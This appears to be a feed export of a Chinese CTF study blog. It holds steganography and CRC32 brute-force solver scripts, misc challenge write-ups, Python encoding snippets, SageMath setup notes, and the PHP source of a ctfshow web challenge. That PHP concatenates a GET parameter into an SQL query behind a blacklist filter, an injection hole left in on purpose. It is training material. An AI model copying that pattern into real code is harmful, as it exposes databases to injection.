class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> in <span class="hljs-keyword">f</span>.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(<span class="hljs-built_in">line</span>.<span class="hljs-keyword">split</span>())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-keyword">split</span>())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.<span class="hljs-built_in">index</span>(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.<span class="hljs-built_in">index</span>(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.<span class="hljs-built_in">count</span>(<span class="hljs-string">&#x27;=&#x27;</span>) #no equalnum <span class="hljs-keyword">no</span> offset<br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += bin(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>([chr(<span class="hljs-keyword">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <br><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#python2</span><br>def get_base64_diff_value(s1, s2):<br>    base64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>    res = <span class="hljs-number">0</span><br>    for i in <span class="hljs-built_in">xrange</span>(<span class="hljs-built_in">len</span>(s2)):<br>        if s1[i] != s2[i]:<br>            return <span class="hljs-built_in">abs</span>(base64chars.<span class="hljs-built_in">index</span>(s1[i]) - base64chars.<span class="hljs-built_in">index</span>(s2[i]))<br>    return res<br><br><br>def <span class="hljs-built_in">solve_stego</span>():<br>    with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>        file_lines = f.<span class="hljs-built_in">readlines</span>()<br>        bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>        for line in file_lines:<br>            steg_line = line.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            norm_line = line.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            diff = <span class="hljs-built_in">get_base64_diff_value</span>(steg_line, norm_line)<br>            print diff<br>            pads_num = steg_line.<span class="hljs-built_in">count</span>(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            if diff:<br>                bin_str += <span class="hljs-built_in">bin</span>(diff)[<span class="hljs-number">2</span>:].<span class="hljs-built_in">zfill</span>(pads_num * <span class="hljs-number">2</span>)<br>            else:<br>                bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * pads_num * <span class="hljs-number">2</span><br>            print <span class="hljs-built_in">goflag</span>(bin_str)<br><br><br>def <span class="hljs-built_in">goflag</span>(bin_str):<br>    res_str = <span class="hljs-string">&#x27;&#x27;</span><br>    for i in <span class="hljs-built_in">xrange</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>):<br>        res_str += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    return res_str<br><br><br>if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">solve_stego</span>()<br><br></code></pre></td></tr></table></figure><h1 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> binascii<br><span class="hljs-attribute">import</span> string<br><br><span class="hljs-attribute">dic</span>=string.printable  <br><span class="hljs-attribute">crc1</span> = <span class="hljs-number">0</span>xe<span class="hljs-number">5</span>c<span class="hljs-number">67</span>f<span class="hljs-number">46</span>  <br><span class="hljs-attribute">crc2</span> = <span class="hljs-number">0</span>x<span class="hljs-number">555</span>fa<span class="hljs-number">1</span>a<span class="hljs-number">2</span><br><span class="hljs-attribute">crc3</span> = <span class="hljs-number">0</span>x<span class="hljs-number">6</span>e<span class="hljs-number">957</span>e<span class="hljs-number">45</span><br><span class="hljs-attribute">crc4</span> = <span class="hljs-number">0</span>x<span class="hljs-number">76</span>d<span class="hljs-number">6</span>a<span class="hljs-number">31</span>a<br><span class="hljs-attribute">crc5</span> = <span class="hljs-number">0</span>x<span class="hljs-number">2</span>b<span class="hljs-number">042586</span><br><br><span class="hljs-attribute">def</span> CrackCrc<span class="hljs-number">4</span>(crc):<br>    <span class="hljs-attribute">for</span> i in dic :<br>        <span class="hljs-attribute">for</span> j in dic:<br>            <span class="hljs-attribute">for</span> p in dic:<br>                <span class="hljs-attribute">for</span> q in dic:<br>                        <span class="hljs-attribute">s</span>=i+j+p+q<br>                        <span class="hljs-attribute">if</span> crc == (binascii.crc<span class="hljs-number">32</span>(s.encode(<span class="hljs-string">&quot;ascii&quot;</span>))):<br>                            <span class="hljs-attribute">print</span> (s)<br>                            <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">1</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">2</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">3</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">4</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">5</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;base一把梭&quot;&gt;&lt;a href=&quot;#base一把梭&quot; class=&quot;headerlink&quot; title=&quot;base一把梭&quot;&gt;&lt;/a&gt;base一把梭&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc题目</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/25/misc%E9%A2%98%E7%9B%AE/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/25/misc%E9%A2%98%E7%9B%AE/</id>
    <published>2022-02-25T12:09:31.000Z</published>
    <updated>2022-03-03T08:33:31.280Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HSC-1th-汝闻，人言否"><a href="#HSC-1th-汝闻，人言否" class="headerlink" title="HSC-1th 汝闻，人言否"></a>HSC-1th 汝闻，人言否</h1><p>题目只给了一张图片，并无任务提示了。<br>我当时我把我能想到的图片隐写全部用上了，看属性，strings，zsteg，LSB，改颜色通道，改宽高，binwalk，看十六进制。都没有找到。</p><p>题目解法：<br>010editor，搜索png的文件0000000049454E44AE426082<br><img src="/picture/misc60.png"><br>文件尾结束之后，后面仍让有内容，看到PK，4B50改成504B</p><p><img src="/picture/misc61.png"><br>文件尾部的也需要更改</p><p>然后binwalk拿到压缩包，压缩包有密码<br>给了提示qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p<br>使用键盘画图（看轨迹），拿到密码WVALOU，打开看到flag文件，丢入010editor，看到是wav类型的，更改后缀名，看频谱图拿到flag</p><h1 id="buu-弱口令"><a href="#buu-弱口令" class="headerlink" title="buu-弱口令"></a>buu-弱口令</h1><p>压缩包有附加信息，不过是由空格、回车和Table组成的，所以看不到<br><img src="/picture/misc62.png"><br>复制到sublime中，因为sublime可以可视化空格和回车<br><img src="/picture/misc63.png"><br>将空格替换为 .    Table为-<br>得到…. . .-.. .-.. —– ..-. — .-. ..- –<br>解密为HELL0FORUM</p><h1 id="buu-喵喵喵"><a href="#buu-喵喵喵" class="headerlink" title="buu-喵喵喵"></a>buu-喵喵喵</h1><p>拿到一张图片丢入stegsolve中，lsb看到一张图片，保存，看到半张二维码，更改高度，得到整张二维码。扫码得到一个网盘地址，下载压缩包，里面只有一个txt文件，说flag不在这里。</p><p><img src="/picture/misc64.png"><br>我看到了flag.pyc<br>我竟然在傻傻的想，压缩包能不能binwalk</p><p>看别人的wp，知道这是NTFS文件流隐写，<strong>看到txt文件，并且毫无头绪一定要想到ntfs</strong></p><p>这里注意要用<code>winrar</code> 解压,因为是winrar 压缩的不然是得不到东西的<br>使用NtfsStreamsEditor<br><img src="/picture/misc65.png"></p><p>uncompyle6 flag.pyc &gt; 111.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>():</span><br>    flag = <span class="hljs-string">&#x27;*************&#x27;</span><br>    ciphertext = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>        s = <span class="hljs-built_in">chr</span>(i ^ <span class="hljs-built_in">ord</span>(flag[i]))<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            s = <span class="hljs-built_in">ord</span>(s) + <span class="hljs-number">10</span><br>        <span class="hljs-keyword">else</span>:<br>            s = <span class="hljs-built_in">ord</span>(s) - <span class="hljs-number">10</span><br>        ciphertext.append(<span class="hljs-built_in">str</span>(s))<br><br>    <span class="hljs-keyword">return</span> ciphertext[::-<span class="hljs-number">1</span>]<br><br><br>ciphertext = [<br> <span class="hljs-string">&#x27;96&#x27;</span>, <span class="hljs-string">&#x27;65&#x27;</span>, <span class="hljs-string">&#x27;93&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;91&#x27;</span>, <span class="hljs-string">&#x27;97&#x27;</span>, <span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-string">&#x27;93&#x27;</span>, <span class="hljs-string">&#x27;70&#x27;</span>, <span class="hljs-string">&#x27;102&#x27;</span>, <span class="hljs-string">&#x27;94&#x27;</span>, <span class="hljs-string">&#x27;132&#x27;</span>, <span class="hljs-string">&#x27;46&#x27;</span>, <span class="hljs-string">&#x27;112&#x27;</span>, <span class="hljs-string">&#x27;64&#x27;</span>, <span class="hljs-string">&#x27;97&#x27;</span>, <span class="hljs-string">&#x27;88&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>, <span class="hljs-string">&#x27;82&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;109&#x27;</span>, <span class="hljs-string">&#x27;99&#x27;</span>, <span class="hljs-string">&#x27;112&#x27;</span>]<br><br></code></pre></td></tr></table></figure><h1 id="buu-从娃娃抓起"><a href="#buu-从娃娃抓起" class="headerlink" title="buu-从娃娃抓起"></a>buu-从娃娃抓起</h1><p>0086 1562 2535 5174<br>bnhn s wwy vffg vffg rrhy fhnv<br>上面是中文电码，下面是五笔简码</p><h1 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h1><p>这题考察零宽度字符隐写</p><p><img src="/picture/misc67.png"><br>很正常的一个txt，看不出什么问题</p><p><img src="/picture/misc68.png"><br>用vim看，可以看到很多零宽度字符</p><p><a href="https://330k.github.io/misc_tools/unicode_steganography.html">零宽度字符解密</a></p><h1 id="7、ctfshow-misc10"><a href="#7、ctfshow-misc10" class="headerlink" title="7、ctfshow-misc10"></a>7、ctfshow-misc10</h1><p><img src="/picture/misc78.png"><br>binwalk这样式的也可能藏flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HSC-1th-汝闻，人言否&quot;&gt;&lt;a href=&quot;#HSC-1th-汝闻，人言否&quot; class=&quot;headerlink&quot; title=&quot;HSC-1th 汝闻，人言否&quot;&gt;&lt;/a&gt;HSC-1th 汝闻，人言否&lt;/h1&gt;&lt;p&gt;题目只给了一张图片，并无任务提示了。&lt;br&gt;</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>密码学Python常用函数</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/20/%E5%AF%86%E7%A0%81%E5%AD%A6Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/20/%E5%AF%86%E7%A0%81%E5%AD%A6Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</id>
    <published>2022-02-20T11:31:20.000Z</published>
    <updated>2022-03-20T08:40:01.226Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是个大坑啊，会慢慢填的</p></blockquote><p>Python2和python3感觉差别还是挺大的（没有标注的代码默认是python3）<br><a href="https://c.runoob.com/compile/6/">Python2 在线工具 | 菜鸟工具 (runoob.com)</a></p><p>python3字节转十六进制字符串</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-builtin-name">print</span>(s.hex())<br><span class="hljs-comment">#打印结果：666c6167</span><br></code></pre></td></tr></table></figure><p>十六进制数字转十进制(int函数的使用)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-attribute">x</span>=s.hex()<br><span class="hljs-builtin-name">print</span>(int(x,16))   # x原本是十六进制转换为十进制<br><span class="hljs-comment">#打印结果：1718378855</span><br></code></pre></td></tr></table></figure><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;12&#x27;</span>,<span class="hljs-number">16</span>)        <span class="hljs-comment"># 如果是带参数base的话，12要以字符串的形式进行输入，12 为 16进制 </span></span><br>18<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>,<span class="hljs-number">16</span>)  </span><br>10  <br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;10&#x27;</span>,<span class="hljs-number">8</span>)  </span><br>8<br></code></pre></td></tr></table></figure><p>字符串转字节</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-builtin-name">print</span>(s.encode())<br><span class="hljs-comment">#打印结果:b&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p>字节转字符串</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-builtin-name">print</span>(s.decode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-comment">#打印结果:flag</span><br></code></pre></td></tr></table></figure><p>字符转数字</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br><span class="hljs-comment">#打印结果:97</span><br></code></pre></td></tr></table></figure><p>python2字符串转十六进制</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#Python2</span><br><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-builtin-name">print</span> s.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-comment">#打印结果：666c6167</span><br></code></pre></td></tr></table></figure><p>十六进制字符串和比特流相互转换</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> binascii import *<br><span class="hljs-attribute">c1</span>=<span class="hljs-string">&#x27;56c36&#x27;</span><br><span class="hljs-attribute">c1</span>=unhexlify(c1)<br><span class="hljs-builtin-name">print</span>(c1)     #b<span class="hljs-string">&#x27;V\xc3j&#x27;</span><br><span class="hljs-attribute">c1</span>=hexlify(c1)<br><span class="hljs-builtin-name">print</span>(c1)     #b<span class="hljs-string">&#x27;56c36a&#x27;</span>   这个也是比特形式的<br></code></pre></td></tr></table></figure><p>整数转二进制bin()<br>bin()返回一个整数 int 或者长整数 long int 的二进制表示。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&gt;&gt;&gt;bin(<span class="hljs-number">10</span>)<br>&#x27;<span class="hljs-number">0b1010</span>&#x27;<br>&gt;&gt;&gt; bin(<span class="hljs-number">20</span>)<br>&#x27;<span class="hljs-number">0b10100</span>&#x27;<br></code></pre></td></tr></table></figure><hr><blockquote><p>[参考博客](<a href="https://blog.csdn.net/ycf18331272870/article/details/88413838?ops_request_misc=%7B%22request_id%22:%22164535627316780261934174%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164535627316780261934174&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-88413838.pc_search_insert_es_download&utm_term=python3+%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6&spm=1018.2226.3001.4187">python3 字符串、十六进制字符串、数字、字节之间的转换_羊驼的博客笔记-CSDN博客_python 十六进制字符串转十六进制</a>)<br>参考书目：CTF特训营</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这是个大坑啊，会慢慢填的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Python2和python3感觉差别还是挺大的（没有标注的代码默认是python3）&lt;br&gt;&lt;a href=&quot;https://c.runoob.com/compile/6/&quot;&gt;P</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>sagemath的安装与使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/14/sagemath%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/14/sagemath%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</id>
    <published>2022-02-14T11:19:16.000Z</published>
    <updated>2022-02-14T11:35:22.666Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sage的安装"><a href="#sage的安装" class="headerlink" title="sage的安装"></a>sage的安装</h2><p>我是用kali安装的sage<br><a href="https://www.sagemath.org/download.html">https://www.sagemath.org/download.html</a><br>进入这个网址<br><img src="/picture/c7.png"><br>Asia中随便选一个进入</p><p><img src="/picture/c8.png"><br>选Linux<br>然后进入下一个界面，选64bits</p><p><img src="/picture/c9.png"><br>然后我选的是红色框中的</p><p>接下来就是等待下载完成<br><code>tar xvf sage-9.0-Debian_GNU_Linux_9-x86_64.tar.bz2</code><br>然后解压压缩包，解压时间有点长，一定耐心等待啊</p><p>在sageMath的文件夹下<br><code>./sage</code><br>之后就可以交互式的使用sage了</p><hr><h2 id="sage的简单使用"><a href="#sage的简单使用" class="headerlink" title="sage的简单使用"></a>sage的简单使用</h2><p>每次在sageMath下  <code>./sage</code> 进行交互式的sage使用<br>或者把sage代码写在一个  test.sage中 ，然后使用命令  <code>./sage test.sage</code> 即可</p><p>sage模块的安装<br>python的模块，sage好像不可以直接使用<br>比如我在代码里import libnum 了，我使用python是有这个模块的，但是我用sage运行，就一直会说没有这个模块<br><code>sage -pip install libnum</code></p><hr><p><a href="https://www.osgeo.cn/sagemath/tutorial/index.html">sage的中文教程</a></p><hr><blockquote><p>需要非常感谢<a href="https://blog.csdn.net/vanarrow/article/details/106051909">这篇博客</a>，我才得以顺利完成sage的安装</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sage的安装&quot;&gt;&lt;a href=&quot;#sage的安装&quot; class=&quot;headerlink&quot; title=&quot;sage的安装&quot;&gt;&lt;/a&gt;sage的安装&lt;/h2&gt;&lt;p&gt;我是用kali安装的sage&lt;br&gt;&lt;a href=&quot;https://www.sagemath.or</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow 萌新web1~7</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/ctfshow-%E8%90%8C%E6%96%B0web1-7/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/ctfshow-%E8%90%8C%E6%96%B0web1-7/</id>
    <published>2022-02-13T12:28:50.000Z</published>
    <updated>2022-02-14T07:16:18.251Z</updated>
    
    <content type="html"><![CDATA[<p>所有题目只有过滤的字符有差别，其余并无差别，下面给出的代码是web7的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;?php<br># 包含数据库连接文件<br>include(&quot;config.php&quot;);<br># 判断get提交的参数id是否存在<br>if(isset($_GET[&#x27;id&#x27;]))&#123;<br>        $id = $_GET[&#x27;id&#x27;];<br>    if(preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;<br>            die(&quot;id error&quot;);<br>    &#125;<br>    # 判断id的值是否大于999<br>    if(intval($id) &gt; 999)&#123;<br>        # id 大于 999 直接退出并返回错误<br>        die(&quot;id error&quot;);<br>    &#125;else&#123;<br>        # id 小于 999 拼接sql语句<br>        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;<br>        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;<br>        # 执行sql 语句<br>        $result = $conn-&gt;query($sql);<br>        # 判断有没有查询结果<br>        if ($result-&gt;num_rows &gt; 0) &#123;<br>            # 如果有结果，获取结果对象的值$row<br>            while($row = $result-&gt;fetch_assoc()) &#123;<br>                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;<br>            &#125;<br>        &#125;<br>        # 关闭数据库连接<br>        $conn-&gt;close();<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br>&lt;/body&gt;<br>&lt;!-- flag in id = 1000 --&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><blockquote><p> 这其中有个函数非常关键，intval()<br><a href="https://www.runoob.com/php/php-intval-function.html">PHP intval() 函数 | 菜鸟教程 (runoob.com)</a></p><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。<br>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br>字符串有可能返回 0，虽然取决于字符串最左侧的字符</p><p><strong>看实例非常重要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>);                     <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">4.2</span>);                    <span class="hljs-comment">// 4</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>);                   <span class="hljs-comment">// 42</span><br><span 